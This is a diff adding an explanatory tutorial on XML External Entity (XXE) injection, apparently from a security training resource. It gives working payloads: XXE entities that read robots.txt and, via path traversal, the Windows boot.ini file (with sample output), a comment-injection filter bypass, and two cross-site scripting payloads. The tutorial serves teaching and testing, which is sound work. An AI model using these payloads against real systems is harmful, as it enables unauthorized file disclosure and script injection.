@@ -1,0 +1,100 @@
+#XML External Entity (XXE) Injection
+
+#Overview 
+
+XML External Entity Attack may result when an application allows an input parameter to be XML or incorporated into XML which is passed to an XML parser running with sufficient privileges to include external or system files. 
+
+#Discovery Methodology 
+
+Attempt to inject XML or reserved characters into input parameters and observe if XML parsing errors are generated. 
+
+For web services, check each input parameter specified in the WSDL document for those of type XML. 
+
+#Exploitation 
+
+Use information disclosed in error messages to determine at what file path the XML parser is parsing. Cause errors to occur using malformed XML, XML that starts with whitespace or null characters, and XML that does not meet the XSL specification. 
+
+Also try to load files that dont exist in order to determine operating system type and the path at which interpretation is taking place. 
+
+For examples, see the XML Entity Attack example 
+
+#Example 
+
+XML is well-known for containing data (text nodes) which are marked-up by tags (element nodes). XML has the ability to have place-holders called entities. Web developers often used pre-defined entities without realizing they are using an XML entity. For example the less than symbol < can be represented by the pre-defined entity &lt;. The &lt; entity is defined in the parser itself. There is no need to declare the &lt; before using it. However developers are allowed to declare their own entities. XML documents also contain a mechanism by which they can import and include external files as part of themselves. The imported file will be included into the XML docment whereever the entity exists. 
+
+Here are some examples to try 
+
+Valid XML without entities 
+
+	<?xml version="1.0"?><change-log><text>Hello World</text></change-log>
+
+XML with the predefined &quot; entity 
+
+
+	<?xml version="1.0"?><change-log><text>&quot;Hello World&quot;</text></change-log>
+
+XML with the user defined myEntity entity 
+
+
+	<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"> ]><change-log><text>Hello &myEntity;</text></change-log>
+
+XML with multiple user defined entities 
+
+
+	<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"><!ENTITY myQuote "&quot;"> ]><change-log><text>&myQuote;Hello &myEntity;&myQuote;</text></change-log>
+
+The <!ENTITY> section of an XML document optionally defines external files to be included as part of the XML document. Interestingly these can even be files from the system parsing the XML. 
+
+To declare an external entity, the <!ENTITY> directive defines the resource represented and the symbol that will represent the entity. In this example, the type of entity is a local system resource as indicated by the "SYSTEM" type, the resource is a local file (./robots.txt), and the symbol that represents the entity is "systemEntity". Entities do not have to be external but in this example the system file happens to be an external resource. Entities can also be strings or other local variables. 
+
+
+	<!ENTITY systemEntity SYSTEM "robots.txt">
+
+The XML parser will import the file. The file can be output into the XML document by placing the symbol in the document preceded by an ampersand (&) and followed by a semicolon (;). 
+
+	<change-log>
+		<text>&systemEntity;</text>
+	</change-log>
+
+In an external entity attack, XML is injected or uploaded to the site in an effort to get the XML parser import the injected entity into the XML, then output the contents of the entity. 
+
+	<?xml version="1.0"?>
+	<!DOCTYPE change-log [
+		<!ENTITY systemEntity SYSTEM "robots.txt">
+	]>
+	<change-log>
+		<text>&systemEntity;</text>
+	</change-log>
+
+If the web server is misconfigured or given too many privileges, the XML parser can import operating system files. This example works on many Windows systems. 
+
+	<?xml version="1.0"?>
+	<!DOCTYPE change-log [
+		<!ENTITY systemEntity SYSTEM "../../../../boot.ini">
+	]>
+	<change-log>
+		<text>&systemEntity;</text>
+	</change-log>
+
+The output will look similar to the following 
+
+	[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /NoExecute=OptIn ; 			
+
+Other injections are possible. This version uses injected comment symbols to alter XML. This is useful for filter bypass. 
+
+<somexml>
+<message>Hello World &lt;!--</message> 
+<place> NJ </place> 
+</somexml>
+
+This is a slightly different version of XXE to fetch the robots.txt. 
+
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text>; </change-log>
+
+This injection results in a cross site script. 
+
+<test> $lDOMDocument->textContent=<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]> </test>
+
+This injection also results in a cross site script. 
+
+<?xml version="1.0"?><change-log><text>&lt;script&gt;alert(&quot;Hello World&quot;)&lt;/script&gt;</text></change-log>
